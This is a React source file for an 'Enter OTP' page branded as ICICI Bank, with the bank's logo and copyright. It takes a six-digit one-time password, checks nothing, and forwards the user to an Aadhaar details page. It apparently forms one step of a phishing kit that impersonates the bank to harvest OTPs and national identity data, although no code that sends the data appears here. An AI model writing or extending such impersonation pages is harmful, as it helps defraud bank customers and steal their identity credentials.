import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const EnterOTPPage = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate('/aadhar-details');
  };

  return (
    <div className="container">
      <div className="header">
        <img src="/icici h.jpg" alt="ICICI Bank Logo" />
      </div>

      <div className="content">
        <h2>Enter OTP</h2>
        <div className="sms-message">
          <p>An OTP has been sent to your registered mobile number.</p>
        </div>

        <div className="input-group">
          <label htmlFor="otp">Enter OTP</label>
          <input
            type="text"
            id="otp"
            name="otp"
            maxLength="6"
            inputMode="numeric"
            required
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
          />
        </div>

        <button className="btn" onClick={handleSubmit}>Verify OTP</button>

        <div className="links">
          <a href="#">Resend OTP</a> | <a href="#">Change Mobile Number</a>
        </div>
      </div>

      <div className="footer">
        <p>&copy; ICICI Bank</p>
      </div>
    </div>
  );
};

export default EnterOTPPage;
